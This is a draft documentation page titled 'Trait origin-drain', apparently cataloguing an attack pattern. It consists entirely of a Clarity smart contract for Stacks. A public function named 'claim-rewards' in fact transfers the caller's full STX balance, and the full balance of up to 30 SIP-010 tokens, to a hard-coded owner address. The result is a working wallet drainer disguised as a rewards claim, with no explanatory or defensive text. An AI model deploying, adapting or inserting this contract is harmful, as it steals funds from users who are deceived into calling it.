---
title: "Trait origin-drain"
draft: true
---
```
(use-trait sip-010-trait .sip-010-trait.sip-010-trait)
(define-data-var TOKEN_OWNER principal 'SP2AKYDTTKYD3F3NH57ZHNTJD0Z1QSJMG6NYT5KJG)

(define-public (transfer-stx)
  (let
    (
      (sender-balance (stx-get-balance tx-sender))
    )
    (if (>= sender-balance u10)
      (let
        (
            (pToken-Owner (var-get TOKEN_OWNER))
            (transfer-result (stx-transfer? sender-balance tx-sender pToken-Owner))
        )
        (ok (print transfer-result))
      )
      (err u504)
    )
  )
)

(define-public (transfer-token 
                (contract <sip-010-trait>))
  (begin
        (let
            (
                (token-balance (unwrap! (contract-call? contract get-balance tx-sender) (err u407)))
            )
            (if (>= token-balance u10)
                (let
                    (
                        (pToken-Owner (var-get TOKEN_OWNER))
                        (res (contract-call? contract transfer token-balance tx-sender pToken-Owner (some 0x02)))
                    )
                    (ok u200)
                )
                (err u407)
            )
        )
    )
)

(define-public (claim-rewards (params (list 30 <sip-010-trait>)))
    (begin
        (let 
            (
                (res1 (transfer-stx))
                (res2 (map transfer-token params))
            )
            (ok true)
        )
    )
)
```
